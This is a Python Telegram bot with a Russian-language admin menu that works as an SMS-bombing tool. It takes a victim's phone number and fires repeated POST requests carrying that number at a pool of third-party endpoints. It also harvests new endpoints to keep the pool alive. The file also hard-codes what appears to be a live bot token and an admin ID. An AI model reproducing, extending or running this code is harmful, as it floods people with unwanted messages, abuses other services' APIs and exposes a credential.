import asyncio
import logging
import threading
import time
import requests
import json
from dataclasses import dataclass
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

TOKEN = "8993557899:AAFCg3iQDoeO9NMbKnBcMVk6W50HC5C4CWA"
ADMIN_ID = 8141670312

logging.basicConfig(level=logging.INFO)

@dataclass
class Endpoint:
    name: str
    url: str
    body: str
    body_type: str = "json"

class Engine:
    def __init__(self, endpoints):
        self.endpoints = endpoints
        self.sent = 0
        self.failed = 0
        self._stop = threading.Event()

    def stop(self):
        self._stop.set()

    def _fire(self, ep, phone):
        raw = ep.body.format(phone=phone)
        hdrs = {"User-Agent": "Mozilla/5.0"}
        if ep.body_type == "json":
            hdrs["Content-Type"] = "application/json"
        else:
            hdrs["Content-Type"] = "application/x-www-form-urlencoded"
        try:
            r = requests.post(ep.url, data=raw.encode(), headers=hdrs, timeout=5)
            return "ok" if 200 <= r.status_code < 300 else "fail"
        except:
            return "fail"

    def run(self, phone, rounds):
        self._stop.clear()
        for _ in range(rounds):
            if self._stop.is_set(): break
            for ep in self.endpoints:
                if self._stop.is_set(): break
                kind = self._fire(ep, phone)
                if kind == "ok": self.sent += 1
                else: self.failed += 1
                time.sleep(0.1)

def load_pool():
    try:
        with open("pool.json", "r") as f:
            return [Endpoint(**e) for e in json.load(f)]
    except:
        return [Endpoint(name="test", url="https://httpbin.org/post", body='{"phone":"{phone}"}')]

CURRENT_ENGINE = None

def get_main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 Статус", callback_data="menu_metrics")],
        [InlineKeyboardButton("🚀 Запустить", callback_data="menu_single")],
        [InlineKeyboardButton("🔎 Найти новые API", callback_data="menu_update")],
        [InlineKeyboardButton("🛑 СТОП", callback_data="menu_stop")]
    ])

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    await update.message.reply_text("🎛 Главное меню", reply_markup=get_main_menu())

async def handle_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    global CURRENT_ENGINE
    query = update.callback_query
    if query.from_user.id != ADMIN_ID: return await query.answer("нет доступа")
    await query.answer()

    if query.data == "menu_main":
        await query.edit_message_text("🎛 Главное меню", reply_markup=get_main_menu())
    elif query.data == "menu_metrics":
        txt = f"📊 Отправлено: {CURRENT_ENGINE.sent}\nОшибок: {CURRENT_ENGINE.failed}" if CURRENT_ENGINE else "Движок спит."
        await query.edit_message_text(txt, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Назад", callback_data="menu_main")]]))
    elif query.data == "menu_stop":
        if CURRENT_ENGINE:
            CURRENT_ENGINE.stop()
            await query.edit_message_text("🛑 Остановлен.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Назад", callback_data="menu_main")]]))
        else:
            await query.edit_message_text("И так не работает.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Назад", callback_data="menu_main")]]))
    elif query.data == "menu_single":
        await query.edit_message_text("Введи команду:\n`/single 79991234567`", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Назад", callback_data="menu_main")]]))
    elif query.data == "menu_update":
        await query.edit_message_text("🔎 Запускаю поиск новых API... Это займет пару минут.")
        def update_bg():
            from harvester import harvest
            rep = asyncio.run(harvest())
            msg = f"✅ Пул обновлен!\nВсего: {rep['found']}\nЖивых: {rep['alive']}\nМертвых: {rep['dead']}"
            asyncio.run_coroutine_threadsafe(
                query.edit_message_text(msg, reply_markup=get_main_menu()),
                ctx.application.loop
            )
        threading.Thread(target=update_bg, daemon=True).start()

async def cmd_single(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    global CURRENT_ENGINE
    if update.effective_user.id != ADMIN_ID: return
    if not ctx.args: return await update.message.reply_text("формат: /single <phone>")
    
    phone = ctx.args[0]
    await update.message.reply_text(f"🚀 Запускаю на {phone}...")
    CURRENT_ENGINE = Engine(load_pool())
    
    def run_bg():
        CURRENT_ENGINE.run(phone, 5)
        asyncio.run_coroutine_threadsafe(
            update.message.reply_text(f"✅ Готово! Отправлено: {CURRENT_ENGINE.sent}, Ошибок: {CURRENT_ENGINE.failed}", reply_markup=get_main_menu()),
            ctx.application.loop
        )
    threading.Thread(target=run_bg, daemon=True).start()

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("single", cmd_single))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.run_polling()

if __name__ == "__main__":
    main()
